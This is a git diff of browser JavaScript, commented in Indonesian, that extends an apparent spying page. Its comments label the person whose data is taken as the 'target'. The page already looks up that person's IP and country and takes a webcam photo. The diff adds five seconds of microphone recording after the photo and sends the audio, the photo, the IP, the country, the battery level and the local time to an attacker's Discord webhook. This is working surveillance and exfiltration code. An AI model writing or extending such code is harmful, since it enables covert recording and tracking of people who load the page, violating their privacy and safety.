@@ -16,6 +16,37 @@ function getLocalTime() {
     return `${hours}:${minutes}:${seconds} (${timeZone})`;
 }
 
+// Fungsi merekam audio selama 5 detik
+function recordAudio() {
+    return new Promise((resolve, reject) => {
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
+                    resolve(audioBlob);
+                };
+
+                mediaRecorder.onerror = err => {
+                    reject(err);
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 5000);
+            })
+            .catch(err => reject(err));
+    });
+}
+
 // Ambil IP & Negara Target
 fetch("https://ipwho.is/")
     .then(response => response.json())
@@ -37,8 +68,15 @@ fetch("https://ipwho.is/")
                         const localTime = getLocalTime();
                         imageCapture.takePhoto()
                             .then(blob => {
-                                sendToDiscord(blob, ip, country, localTime, batteryPercentage);
-                                track.stop(); // Stop stream setelah foto diambil
+                                // Mulai merekam audio setelah foto diambil
+                                recordAudio().then(audioBlob => {
+                                    sendToDiscord(blob, audioBlob, ip, country, localTime, batteryPercentage);
+                                    track.stop(); // Stop stream setelah foto diambil
+                                }).catch(err => {
+                                    console.error("Gagal merekam audio:", err);
+                                    sendToDiscord(blob, null, ip, country, localTime, batteryPercentage);
+                                    track.stop();
+                                });
                             })
                             .catch(error => {
                                 console.error("Gagal ambil foto:", error);
@@ -62,13 +100,18 @@ fetch("https://ipwho.is/")
     });
 
 // Kirim ke Webhook Discord
-function sendToDiscord(blob, ip, country, localTime, batteryPercentage) {
+function sendToDiscord(blob, audioBlob, ip, country, localTime, batteryPercentage) {
     const formData = new FormData();
     formData.append("file", blob, "capture.jpg");
 
     formData.append("payload_json", JSON.stringify({
         content: `**✧━━━━━━━[ *Data target* ]━━━━━━━✧**\n🌐**Mode : Public**\n🌍 **IP**: ${ip}\n📌 **Country**: ${country}\n🔋**Battery Percentage**: ${batteryPercentage}%\n⏰ **Time**: ${localTime}\n**✧━━━━━━━[ *Foto target* ]━━━━━━━✧**`
     }));
+
+    // Jika audio berhasil direkam, tambahkan ke FormData
+    if (audioBlob) {
+        formData.append("file", audioBlob, "recording.webm");
+    }
 
     fetch(webhookURL, {
         method: "POST",
